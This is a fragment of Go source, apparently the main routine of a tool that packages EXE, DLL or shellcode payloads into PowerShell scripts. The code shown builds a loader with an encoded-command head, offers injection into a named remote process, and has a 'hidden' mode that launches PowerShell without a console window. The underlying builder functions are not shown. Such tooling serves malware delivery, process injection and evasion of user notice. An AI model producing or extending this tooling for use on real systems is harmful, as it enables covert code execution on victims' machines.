	if payloadType != "exe" && len(exeArgs) != 0 {
		die("--exe-arg is only supported for EXE payloads", 1)
	}
	if payloadType != "shellcode" && waitSet {
		die("--timeout and --detach are only supported for shellcode", 1)
	}
	if len(payload) > largeWarn {
		fmt.Fprintf(os.Stderr, "%s: warning: payload is %.1f MB; scripts larger than 50 MB become slow to parse and run\n",
			progName, float64(len(payload))/(1024*1024))
	}

	outPath := resolveOutput(input, format, output)
	if !force {
		if _, err := os.Stat(outPath); err == nil {
			die("output file exists (use --force to overwrite): "+outPath, 1)
		}
	}

	sum := sha256.Sum256(payload)
	sha := hex.EncodeToString(sum[:])

	var core string
	if payloadType != "shellcode" {
		core = buildPECore(payloadType, arch, payload, sha, verify, target, exeArgs)
	} else if target != "" {
		core, err = buildInjectCore(payloadType, arch, payload, sha, verify,
			escapePSLiteral(target), timeoutMs, detach)
	} else {
		core, err = buildCore(payloadType, arch, payload, sha, verify, timeoutMs, detach)
	}
	if err != nil {
		die(err.Error(), 1)
	}
	text := core
	if format != "ps1" {
		command := buildLoader()
		if hidden {
			command = buildBackgroundLauncher(arch, "$env:B2P_SELF")
		}
		head, err := buildHead(arch, encodeCommand(command))
		if err != nil {
			die(err.Error(), 1)
		}
		text = head + core
	} else if hidden {
		text = buildBackgroundLauncher(arch, "$PSCommandPath") + core
	}

	if err := os.MkdirAll(filepath.Dir(outPath), 0o755); err != nil {
		die("cannot create output directory: "+err.Error(), 1)
	}
	if err := writeScript(outPath, text); err != nil {
		die(err.Error(), 1)
	}

	outSize := int64(0)
	if ost, err := os.Stat(outPath); err == nil {
		outSize = ost.Size()
	}
	verifyState := "off"
	if verify {
		verifyState = "on"
	}
	hiddenState := "off"
	if hidden {
		hiddenState = "on"
	}
	fmt.Printf("%s: wrote %s\n", progName, outPath)
	fmt.Printf("  format : %s   type: %s   arch: %s\n", format, payloadType, arch)
	fmt.Printf("  payload: %d bytes   sha256 %s\n", len(payload), sha)
	fmt.Printf("  output : %d bytes   verify: %s   hidden: %s\n", outSize, verifyState, hiddenState)
	if target != "" && payloadType == "dll" {
		fmt.Printf("  mode   : remote DLL   target: %s\n", target)
	} else if target != "" {
		fmt.Printf("  mode   : remote   target: %s   timeout: %s   detach: %v\n",
			target, timeoutText(timeoutMs), detach)
		fmt.Printf("  note   : the payload bitness must match the target process bitness\n")
	} else {
		fmt.Printf("  mode   : local    (the payload runs inside the PowerShell runner)\n")
	}
	if hidden {
		fmt.Printf("  note   : launcher returns after starting a separate PowerShell process without a console window\n")
	}
}
